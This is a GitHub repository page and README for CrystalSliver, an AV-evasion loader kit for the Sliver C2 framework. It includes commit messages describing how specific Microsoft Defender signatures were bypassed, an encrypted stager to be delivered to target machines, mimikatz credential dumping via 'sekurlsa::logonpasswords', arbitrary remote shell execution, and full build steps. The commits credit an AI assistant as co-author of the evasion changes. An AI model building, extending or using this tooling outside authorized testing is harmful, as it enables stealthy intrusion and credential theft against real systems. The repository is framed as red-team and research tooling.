# https://github.com/licitrasimone/CrystalSliver

[Skip to content](https://github.com/licitrasimone/CrystalSliver#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/licitrasimone/CrystalSliver) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/licitrasimone/CrystalSliver) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/licitrasimone/CrystalSliver) to refresh your session.Dismiss alert

{{ message }}

[licitrasimone](https://github.com/licitrasimone)/ **[CrystalSliver](https://github.com/licitrasimone/CrystalSliver)** Public

- [Notifications](https://github.com/login?return_to=%2Flicitrasimone%2FCrystalSliver) You must be signed in to change notification settings
- [Fork\\
8](https://github.com/login?return_to=%2Flicitrasimone%2FCrystalSliver)
- [Star\\
69](https://github.com/login?return_to=%2Flicitrasimone%2FCrystalSliver)


main

[**1** Branch](https://github.com/licitrasimone/CrystalSliver/branches) [**0** Tags](https://github.com/licitrasimone/CrystalSliver/tags)

[Go to Branches page](https://github.com/licitrasimone/CrystalSliver/branches)[Go to Tags page](https://github.com/licitrasimone/CrystalSliver/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>![licitrasimone](https://avatars.githubusercontent.com/u/24960054?v=4&size=40)![claude](https://avatars.githubusercontent.com/u/81847?v=4&size=40)<br>[licitrasimone](https://github.com/licitrasimone/CrystalSliver/commits?author=licitrasimone)<br>and<br>[claude](https://github.com/licitrasimone/CrystalSliver/commits?author=claude)<br>[docs: update for Initialize export, evasion fixes, and in-memory load…](https://github.com/licitrasimone/CrystalSliver/commit/53db225f032399d23a6694a5ac6f0164debda7ed)<br>Open commit details<br>last weekJun 12, 2026<br>[53db225](https://github.com/licitrasimone/CrystalSliver/commit/53db225f032399d23a6694a5ac6f0164debda7ed) · last weekJun 12, 2026<br>## History<br>[19 Commits](https://github.com/licitrasimone/CrystalSliver/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/licitrasimone/CrystalSliver/commits/main/) 19 Commits |
| [crystal-kit-sliver](https://github.com/licitrasimone/CrystalSliver/tree/main/crystal-kit-sliver "crystal-kit-sliver") | [crystal-kit-sliver](https://github.com/licitrasimone/CrystalSliver/tree/main/crystal-kit-sliver "crystal-kit-sliver") | [fix: evade Win64/MeterBof.A — rename go export, strip BOF strings, fi…](https://github.com/licitrasimone/CrystalSliver/commit/f908321ebf90f83f5d14ad4bba6fd756b89744c9 "fix: evade Win64/MeterBof.A — rename go export, strip BOF strings, fix RWX  - Rename exported symbol go → Initialize in both crystal-loader.c and   crystal-exec.c; update extension.json entrypoint accordingly.   The go(char*, uint32_t, callback) export is the primary MeterBof.A   static signature — renaming it removes the match. - Remove all [crystal-loader] / [crystal-exec] / PICO-identifying string   literals from both DLLs; replace with short generic error strings. - Fix crystal-loader.c VirtualAlloc(PAGE_EXECUTE_READWRITE) → VirtualAlloc(RW)   + VirtualProtect(RX); no RWX mapping ever held (same fix applied to   crystal-exec.c in previous commit). - Add -s / -ffunction-sections / -fdata-sections / --gc-sections to   wrapper/Makefile; crystal-loader.x64.dll shrinks from ~232 KB to 42 KB.") | last weekJun 12, 2026 |
| [docs](https://github.com/licitrasimone/CrystalSliver/tree/main/docs "docs") | [docs](https://github.com/licitrasimone/CrystalSliver/tree/main/docs "docs") | [docs: update for Initialize export, evasion fixes, and in-memory load…](https://github.com/licitrasimone/CrystalSliver/commit/53db225f032399d23a6694a5ac6f0164debda7ed "docs: update for Initialize export, evasion fixes, and in-memory loading model  - TOOLCHAIN.md §3c: crystal-loader now ~42 KB, exports Initialize, RW→RX,   -s + --gc-sections flags, no identifying strings - TOOLCHAIN.md §3d: crystal-exec now ~75 KB, gen_pico_header.py replaces xxd,   XOR-encrypted embedded PICO, same evasion properties as §3c - RUNBOOK.md §1.1: correct DLL sizes (42/75 KB) - RUNBOOK.md §3: add Defender surface note — DLLs load in-memory via Sliver,   PICO file from upload IS on disk and visible to scanner - RUNBOOK.md §4: note crystal-exec DLL is in-memory, PICO XOR-encrypted at build - README.md: fix RWX→RW+RX description, update verified table sizes/export,   fix default-jdk → openjdk-17-jdk in quick build  Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>") | last weekJun 12, 2026 |
| [.gitignore](https://github.com/licitrasimone/CrystalSliver/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/licitrasimone/CrystalSliver/blob/main/.gitignore ".gitignore") | [feat: two-file stager with AES-256-CBC evasion (bypasses Wacatac.B!ml…](https://github.com/licitrasimone/CrystalSliver/commit/74b0d2ed1b77f30dc7cacea2255b43c84f9eb1ed "feat: two-file stager with AES-256-CBC evasion (bypasses Wacatac.B!ml + ZomBytes.B)  - Redesign stager as two-file delivery: csvchelper.exe (~17 KB) + payload.dat   (AES-256-CBC encrypted PICO). Removes the 36 MB high-entropy .data blob that   triggered VirTool:Win64/ZomBytes.B static detection. - Replace XOR+NtCreateSection approach with BCryptDecrypt (AES-256-CBC) +   VirtualAlloc(RW)/VirtualProtect(RX). No Nt* strings in .rdata, no   PAGE_EXECUTE_READWRITE mapping, no GetProcAddress/ntdll pattern. - Add manifest.xml (asInvoker, RT_MANIFEST resource ID 1) to suppress UAC   auto-elevation triggered by \"Update\"/\"Service\" keywords in FileDescription. - Update FileDescription in resource.rc to avoid UAC heuristic trigger words. - gen_payload.py now calls openssl for AES encryption; produces payload.dat +   payload_key.h (key+IV, compiled in, never committed via .gitignore). - Makefile: add -s (strip symbols), -ffunction-sections/-fdata-sections,   --gc-sections to keep binary clean and small. - Update all docs (RUNBOOK, TOOLCHAIN, README, crystal-kit-sliver/README)   to reflect two-file delivery, new evasion profile, and UAC fix.") | last weekJun 11, 2026 |
| [LICENSE](https://github.com/licitrasimone/CrystalSliver/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/licitrasimone/CrystalSliver/blob/main/LICENSE "LICENSE") | [feat: rystal Palace evasion kit ported to Sliver C2](https://github.com/licitrasimone/CrystalSliver/commit/1ea15255e6293c023f4bfdd30b07d33bbef6127c "feat: rystal Palace evasion kit ported to Sliver C2") | last monthMay 14, 2026 |
| [NOTICE.md](https://github.com/licitrasimone/CrystalSliver/blob/main/NOTICE.md "NOTICE.md") | [NOTICE.md](https://github.com/licitrasimone/CrystalSliver/blob/main/NOTICE.md "NOTICE.md") | [feat: rystal Palace evasion kit ported to Sliver C2](https://github.com/licitrasimone/CrystalSliver/commit/1ea15255e6293c023f4bfdd30b07d33bbef6127c "feat: rystal Palace evasion kit ported to Sliver C2") | last monthMay 14, 2026 |
| [README.md](https://github.com/licitrasimone/CrystalSliver/blob/main/README.md "README.md") | [README.md](https://github.com/licitrasimone/CrystalSliver/blob/main/README.md "README.md") | [docs: update for Initialize export, evasion fixes, and in-memory load…](https://github.com/licitrasimone/CrystalSliver/commit/53db225f032399d23a6694a5ac6f0164debda7ed "docs: update for Initialize export, evasion fixes, and in-memory loading model  - TOOLCHAIN.md §3c: crystal-loader now ~42 KB, exports Initialize, RW→RX,   -s + --gc-sections flags, no identifying strings - TOOLCHAIN.md §3d: crystal-exec now ~75 KB, gen_pico_header.py replaces xxd,   XOR-encrypted embedded PICO, same evasion properties as §3c - RUNBOOK.md §1.1: correct DLL sizes (42/75 KB) - RUNBOOK.md §3: add Defender surface note — DLLs load in-memory via Sliver,   PICO file from upload IS on disk and visible to scanner - RUNBOOK.md §4: note crystal-exec DLL is in-memory, PICO XOR-encrypted at build - README.md: fix RWX→RW+RX description, update verified table sizes/export,   fix default-jdk → openjdk-17-jdk in quick build  Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>") | last weekJun 12, 2026 |
| View all files |

## Repository files navigation

# crystal-kit-sliver

[Permalink: crystal-kit-sliver](https://github.com/licitrasimone/CrystalSliver#crystal-kit-sliver)

Crystal Palace evasion kit ported to [Sliver C2](https://sliver.sh/).

This is the first public port of rasta-mouse's [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit) (Cobalt Strike) to Sliver. It follows the same cross-C2 pattern proven by [Crystal-Kit-Xenon](https://github.com/nickswink/Crystal-Kit-Xenon) (Mythic).

- **License:** MIT — Copyright (c) 2026 Simone Licitra
- **Target:** Windows x64 only (upstream constraint)
- **Status:** verified end-to-end — Kali build pipeline + Windows 10 x64 FLARE-VM runtime. Sliver session established.

* * *

## What it does

[Permalink: What it does](https://github.com/licitrasimone/CrystalSliver#what-it-does)

Replaces Sliver's default reflective loader and post-ex execution path with [Crystal Palace](https://tradecraftgarden.org/) (Raphael Mudge, BSD). The result is a position-independent code (PICO) blob that bundles:

- ror13 hash-based API resolution (no plain `LoadLibrary` / `GetProcAddress`)
- IAT hooks on `VirtualAlloc` / `VirtualProtect` / `VirtualFree` / `LoadLibraryA`
- Draugr call stack spoofing during callbacks
- XOR sleep mask over the embedded DLL
- libtcg-based runtime obfuscation

The Sliver implant DLL (or any post-ex DLL) is XOR-masked inside the PICO and only unmasked in memory at execution time.

* * *

## Two use cases

[Permalink: Two use cases](https://github.com/licitrasimone/CrystalSliver#two-use-cases)

### A — Implant evasion (PRIMARY)

[Permalink: A — Implant evasion (PRIMARY)](https://github.com/licitrasimone/CrystalSliver#a--implant-evasion-primary)

The raw Sliver implant DLL is never executed directly on target. Instead it is wrapped with Crystal Palace into a PICO, AES-256-CBC encrypted, and delivered with a custom stager (~17 KB) that decrypts and executes it in memory.

```
sliver-server generate --format shared → impl.dll
        │
        ▼
generate-implant.sh --dll impl.dll → sliver.crystal.bin  (~110 KB PICO)
        │
        ▼
bundle-stager.sh                   → csvchelper.exe (~17 KB, no embedded payload)
                                   → payload.dat    (~36 MB AES-256-CBC ciphertext)
        │
        ▼ deliver BOTH files to same directory on target
        ▼
Windows VM: csvchelper.exe
        │
        ▼ BCrypt AES-256-CBC decrypt payload.dat → PICO in RW memory
        ▼ VirtualProtect(RX) → CreateThread → Crystal Palace entry
        ▼ register .pdata → TLS callbacks → DllMain → StartW() → beacon goroutine → HTTP session
```

### B — Post-ex evasion (SECONDARY)

[Permalink: B — Post-ex evasion (SECONDARY)](https://github.com/licitrasimone/CrystalSliver#b--post-ex-evasion-secondary)

Once a session is active, run sensitive DLLs (recon, credential dumpers, etc.) through Crystal Palace via a Sliver Extension.

```
sliver > extensions install crystal-loader-0.1.0.tar.gz
sliver > crystal --payload C:/path/mimikatz.pico.bin
```

Pass runtime args without a rebuild by appending them after `|`:

```
sliver > crystal --payload C:/path/file.pico.bin|args here
```

The `crystal-loader.x64.dll` is a Sliver DLL Extension that reads the PICO blob from disk into a `VirtualAlloc(RW)` region, flips it to RX with `VirtualProtect`, and jumps to the Crystal Palace entrypoint. No `PAGE_EXECUTE_READWRITE` mapping is ever held. Paths use forward slashes. Arg format is `type:string` (not BOF binary). The DLL is loaded in-memory by Sliver — it is not written as a file to the target disk.

### C — Built-in shell execution via Crystal Palace

[Permalink: C — Built-in shell execution via Crystal Palace](https://github.com/licitrasimone/CrystalSliver#c--built-in-shell-execution-via-crystal-palace)

`crystal-exec` is a second command bundled in the same extension. It runs arbitrary shell commands through Crystal Palace evasion using a PICO embedded directly in the extension DLL — no PICO file to upload.

```
sliver > crystal-exec --cmd "whoami /all"
```

Output is returned to the operator over the existing Sliver session via a pipe. This is the fastest path for one-off shell commands when you do not need a full post-ex DLL.

* * *

## Repo layout

[Permalink: Repo layout](https://github.com/licitrasimone/CrystalSliver#repo-layout)

```
crystal-kit-sliver/
├── loader/              ← Reflective loader sources (Use case A) — verbatim from Crystal-Kit
├── postex-loader/       ← Post-ex loader sources (Use case B) — Crystal-Kit + Xenon patch
├── libtcg.x64.zip       ← Upstream binary dependency (kept in tree for build convenience)
└── sliver-glue/         ← Sliver-specific build glue
    ├── extension.json           Sliver Extension manifest
    ├── generate.sh              Wrap a post-ex DLL  → PICO (Use case B)
    ├── generate-implant.sh      Wrap a Sliver DLL   → PICO (Use case A)
    ├── bundle-implant.sh        Bundle PICO + Crystal Palace demo stager into drop.zip (legacy)
    ├── bundle-stager.sh         Build custom stager: csvchelper.exe + payload.dat (primary)
    ├── pack-extension.sh        Pack DLL + manifest into Sliver Extension tarball
    ├── Makefile                 make objects / package / clean
    ├── stager/                  Custom stager sources (AES-256-CBC, asInvoker manifest)
    └── wrapper/                 crystal-loader.c (BOF-compat DLL wrapper)

docs/
├── RUNBOOK.md           Step-by-step Kali → Windows lab procedure
├── PORTING_MAP.md       File-by-file mapping Crystal-Kit → this repo + literal diffs
└── TOOLCHAIN.md         Build prerequisites and pipeline details
```

* * *

## Quick build (Kali / Debian / Ubuntu)

[Permalink: Quick build (Kali / Debian / Ubuntu)](https://github.com/licitrasimone/CrystalSliver#quick-build-kali--debian--ubuntu)

```
# 1. Toolchain
sudo apt install -y mingw-w64 nasm openjdk-17-jdk make zip git curl

# 2. Crystal Palace dist (BSD-3-Clause, Raphael Mudge)
mkdir -p external/crystalpalace
curl -fsSL https://tradecraftgarden.org/download/cpdist-latest.tgz \
   | tar -xz -C external/crystalpalace/
export CRYSTAL_PALACE_HOME=$(pwd)/external/crystalpalace/dist

# 3. Build everything
make -C crystal-kit-sliver/loader all
make -C crystal-kit-sliver/postex-loader all
make -C crystal-kit-sliver/sliver-glue/wrapper all
make -C crystal-kit-sliver/sliver-glue/wrapper smoketest
make -C crystal-kit-sliver/sliver-glue/crystal-exec all

# 4. Use case A — wrap a Sliver implant and build the stager
./crystal-kit-sliver/sliver-glue/generate-implant.sh --dll /path/to/sliver-impl.dll \
   crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin
./crystal-kit-sliver/sliver-glue/bundle-stager.sh \
   crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin \
   crystal-kit-sliver/sliver-glue/build/csvchelper.exe
# → produces build/csvchelper.exe + build/payload.dat (deliver both to target)

# 5. Use case B — wrap a post-ex DLL (postex.sh handles naming and prints the sliver command)
./crystal-kit-sliver/sliver-glue/postex.sh /path/to/postex.dll
# With baked-in args:  postex.sh /path/to/postex.dll "sekurlsa::logonpasswords exit"
./crystal-kit-sliver/sliver-glue/pack-extension.sh

# 6. crystal-exec — rebuild the built-in command executor (only needed after modifying crystalexec.c)
cd crystal-kit-sliver/sliver-glue/crystal-exec && make && cd -
./crystal-kit-sliver/sliver-glue/pack-extension.sh
```

See `docs/RUNBOOK.md` for the full operator procedure (Sliver install, listener setup, target execution, troubleshooting).

* * *

## What is verified

[Permalink: What is verified](https://github.com/licitrasimone/CrystalSliver#what-is-verified)

| Item | Status | Evidence |
| --- | --- | --- |
| All Crystal-Kit sources compile under MinGW 15.2 + NASM 3.01 | OK | `make all` clean, 8 `.o` \+ 1 `.bin` per loader |
| Xenon post-ex patches present | OK | `dfr "ror13"`, `_DLLARGS_` section, `dll_arguments` param in `DLL_PROCESS_ATTACH` |
| Crystal Palace CLI verified | OK | `./link <spec> <dll> <out.bin> [%KEY=value]` — positional, documented in `dist/README` |
| End-to-end PICO build (Use case A) | OK | 117 KB PICO produced from test DLL |
| End-to-end PICO build (Use case B) | OK | 111 KB PICO produced via `postex-loader/loader.spec` |
| Sliver Extension wrapper DLL builds | OK | `crystal-loader.x64.dll` ~42 KB, `crystal-exec.x64.dll` ~75 KB — both PE32+ exporting `Initialize` symbol; no RWX; stripped |
| Extension tarball packs correctly | OK | 37 KB tarball validated with `tar -tzf` |
| Custom stager build (two-file delivery) | OK | `bundle-stager.sh` → `csvchelper.exe` (17 KB, entropy 4.784) + `payload.dat` (AES-256-CBC) |
| Runtime execution on Windows (Use case A) | OK | Sliver session established on Windows 10 x64 FLARE-VM; stager passes Defender (Wacatac.B!ml + ZomBytes.B) |
| Runtime execution on Windows (Use case B) | OK | `crystal --payload C:/path/file.pico.bin` — new Sliver session established via post-ex PICO; arg format verified as `type:string`, forward slash path |
| `crystal-exec` command | OK | Shell command output returned to operator via pipe; PICO embedded in extension DLL, no upload required |

* * *

## Dependencies

[Permalink: Dependencies](https://github.com/licitrasimone/CrystalSliver#dependencies)

| Dependency | License | How to obtain | Bundled? |
| --- | --- | --- | --- |
| Crystal Palace (`crystalpalace.jar`, `link`, etc.) | BSD-3-Clause, (c) 2025 Raphael Mudge / AFF-WG | `curl -O https://tradecraftgarden.org/download/cpdist-latest.tgz` | No (`.gitignore` excludes `external/`) |
| `libtcg.x64.zip` | Upstream binary, license unstated (likely QEMU TCG-derived) | Copied from upstream Crystal-Kit repo | Yes, kept in tree for build convenience |
| Sliver C2 | GPLv3 | [https://sliver.sh](https://sliver.sh/) | No — runtime dependency only |
| MinGW-w64 + NASM | GPL-compatible | `apt install` or `brew install` | No |

This repository does NOT redistribute `crystalpalace.jar`. The build pipeline fetches it externally and references it via the `CRYSTAL_PALACE_HOME` environment variable.

* * *

## Attribution

[Permalink: Attribution](https://github.com/licitrasimone/CrystalSliver#attribution)

See [`NOTICE.md`](https://github.com/licitrasimone/CrystalSliver/blob/main/NOTICE.md) for the full list of upstream copyrights and licenses. Brief summary:

- **rasta-mouse** — Crystal-Kit (MIT) — base reflective loader, postex loader, spec files
- **nickswink** — Crystal-Kit-Xenon (MIT) — cross-C2 patch template (smart pointers removal + `dll_args` section)
- **Raphael Mudge / AFF-WG** — Crystal Palace (BSD-3-Clause) — linker and PIC tooling
- **TrustedSec** — COFFLoader (BSD-3-Clause) — BOF compatibility layer (`beacon.h`, `beacon_compatibility.c/h`)
- **BishopFox** — Sliver C2 (GPLv3) — target framework

* * *

## Roadmap

[Permalink: Roadmap](https://github.com/licitrasimone/CrystalSliver#roadmap)

- [x]  1 — Audit upstream repos + extract diff between Crystal-Kit and Crystal-Kit-Xenon
- [x]  2 — Toolchain documentation + repository scaffold
- [x]  3 — File-by-file porting map with literal diffs (`docs/PORTING_MAP.md`)
- [x]  4 — Sources copied + Xenon patches applied + LICENSE + NOTICE
- [x]  5 — `sliver-glue/` glue scripts and Extension manifest
- [x]  6a — DLL wrapper written, built (MinGW 15.2), packaged, smoke test shellcode
- [x]  6b — Crystal Palace CLI verified, real PICO built end-to-end
- [x]  6c — Dual use case A/B: `generate-implant.sh` \+ `bundle-implant.sh`
- [x]  6d — Runtime test on Windows x64 lab — Use case A verified (Sliver session established on FLARE-VM)
- [x]  6e — Use case B runtime verified (`crystal --payload` works, arg format fixed to `type:string`, forward slash path)
- [x]  6f — `crystal-exec` command: built-in post-ex shell execution via Crystal Palace (no upload required)
- [x]  6g — Runtime args via `|` separator for dynamic DLL args without rebuild

* * *

## Disclaimer

[Permalink: Disclaimer](https://github.com/licitrasimone/CrystalSliver#disclaimer)

Offensive security tooling intended for authorized red team engagements, lab research, and education. Use only in environments where you have written authorization. The author assumes no responsibility for misuse.

## About

Crystal Palace Evasion kit for Sliver


### Resources

[Readme](https://github.com/licitrasimone/CrystalSliver#readme-ov-file)

### License

[MIT license](https://github.com/licitrasimone/CrystalSliver#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/licitrasimone/CrystalSliver).

[Activity](https://github.com/licitrasimone/CrystalSliver/activity)

### Stars

[**69**\\
stars](https://github.com/licitrasimone/CrystalSliver/stargazers)

### Watchers

[**0**\\
watching](https://github.com/licitrasimone/CrystalSliver/watchers)

### Forks

[**8**\\
forks](https://github.com/licitrasimone/CrystalSliver/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Flicitrasimone%2FCrystalSliver&report=licitrasimone+%28user%29)

## [Releases](https://github.com/licitrasimone/CrystalSliver/releases)

No releases published

## [Packages\  0](https://github.com/users/licitrasimone/packages?repo_name=CrystalSliver)

No packages published

## [Contributors\  2](https://github.com/licitrasimone/CrystalSliver/graphs/contributors)

- [![@licitrasimone](https://avatars.githubusercontent.com/u/24960054?s=64&v=4)](https://github.com/licitrasimone)[**licitrasimone** Simone Licitra](https://github.com/licitrasimone)
- [![@claude](https://avatars.githubusercontent.com/u/81847?s=64&v=4)](https://github.com/claude)[**claude** Claude](https://github.com/claude)

## Languages

- [C76.8%](https://github.com/licitrasimone/CrystalSliver/search?l=c)
- [Shell7.2%](https://github.com/licitrasimone/CrystalSliver/search?l=shell)
- [Assembly6.9%](https://github.com/licitrasimone/CrystalSliver/search?l=assembly)
- [Ruby3.9%](https://github.com/licitrasimone/CrystalSliver/search?l=ruby)
- [Makefile3.6%](https://github.com/licitrasimone/CrystalSliver/search?l=makefile)
- [Python1.6%](https://github.com/licitrasimone/CrystalSliver/search?l=python)

You can’t perform that action at this time.